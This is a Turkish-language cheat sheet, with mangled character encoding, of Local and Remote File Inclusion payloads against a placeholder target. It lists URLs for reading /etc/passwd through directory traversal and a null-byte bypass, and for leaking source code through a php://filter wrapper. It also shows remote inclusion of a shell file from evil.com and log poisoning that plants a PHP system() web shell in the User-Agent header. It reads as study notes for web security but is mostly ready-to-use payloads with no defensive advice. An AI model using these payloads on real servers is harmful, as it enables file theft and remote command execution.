## ğŸ“‚ File Inclusion 5 - Payload ve Exploit Ã–rnekleri  

LFI (Local File Inclusion) ve RFI (Remote File Inclusion) zafiyetleri, kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan dosya parametrelerinin yeterince filtrelenmemesi sonucu ortaya Ã§Ä±kar.  
SaldÄ±rganlar bu zafiyetleri kullanarak dosya sistemi Ã¼zerinde gezinebilir, hassas dosyalarÄ± okuyabilir veya uzaktan zararlÄ± kod Ã§alÄ±ÅŸtÄ±rabilir.  

AÅŸaÄŸÄ±da yaygÄ±n payload ve exploit Ã¶rnekleri listelenmiÅŸtir:  

---

### 1. Directory Traversal ile Dosya Okuma (LFI)  
**Payload (URL):**  
http://target.com/index.php?page=../../../../etc/passwd  

**KullanÄ±m:**  
- `../` ile klasÃ¶r geri gidilerek sistem dosyalarÄ±na eriÅŸim saÄŸlanÄ±r.  

**SonuÃ§:**  
- `/etc/passwd` dosyasÄ± gÃ¶rÃ¼ntÃ¼lenir.  
- KullanÄ±cÄ± hesaplarÄ± ve sistem bilgileri ele geÃ§irilir.  

---

### 2. Null Byte (%00) Bypass (Eski PHP VersiyonlarÄ±)  
**Payload (URL):**  
http://target.com/index.php?page=../../../../etc/passwd%00  

**KullanÄ±m:**  
- `%00` null byte karakteri ile `.php` ekinin zorunlu tutulduÄŸu filtreler bypass edilir.  

**SonuÃ§:**  
- Sunucu dosyayÄ± PHP dosyasÄ± gibi derlemeye Ã§alÄ±ÅŸmaz ve dÃ¼z metin okunur.  

---

### 3. PHP Wrappers ile Kod YÃ¼rÃ¼tme  
**Payload (URL):**  
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php  

**KullanÄ±m:**  
- `php://filter` wrapper kullanÄ±larak dosya base64 formatÄ±nda okunur.  
- Base64 Ã§Ã¶zÃ¼mlendiÄŸinde kaynak kod elde edilir.  

**SonuÃ§:**  
- Kaynak kod ifÅŸa olur, gizli anahtarlar veya DB bilgileri ele geÃ§irilebilir.  

---

### 4. RFI ile Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma  
**Payload (URL):**  
http://target.com/index.php?page=http://evil.com/shell.txt  

**KullanÄ±m:**  
- Sunucu `allow_url_include=On` ve `allow_url_fopen=On` ise saldÄ±rgan kendi sunucusundan PHP shell dosyasÄ± Ã§eker.  

**SonuÃ§:**  
- SaldÄ±rgan hedef sistem Ã¼zerinde uzaktan komut Ã§alÄ±ÅŸtÄ±rabilir.  

---

### 5. Log Poisoning ile Kod Enjeksiyonu (LFI Abuse)  
**AdÄ±mlar:**  
1. HTTP header iÃ§ine PHP kodu enjekte et:  
User-Agent: <?php system($_GET['cmd']); ?>  

2. ArdÄ±ndan log dosyasÄ± Ã§aÄŸrÄ±lÄ±r:  
http://target.com/index.php?page=../../../../var/log/apache2/access.log  

**KullanÄ±m:**  
- LFI zafiyeti log dosyalarÄ± Ã¼zerinden okunabilir.  
- Daha Ã¶nce header iÃ§ine enjekte edilen PHP kodu loglarda bulunur.  

**SonuÃ§:**  
- SaldÄ±rgan `?cmd=id` gibi parametrelerle uzaktan komut Ã§alÄ±ÅŸtÄ±rÄ±r.  

---

ğŸ“Œ **Ã–zet:**  
- LFI saldÄ±rÄ±larÄ±nda en Ã§ok kullanÄ±lan yÃ¶ntemler: **directory traversal**, **null byte**, **log poisoning**, **wrapper abuse**.  
- RFI saldÄ±rÄ±larÄ±nda: **uzaktan PHP shell Ã§aÄŸÄ±rma**.  
- Wrapper tabanlÄ± payloadlar ve Base64 encode/ decode yÃ¶ntemleri, filtreleri aÅŸmak iÃ§in en kritik tekniklerdir.  
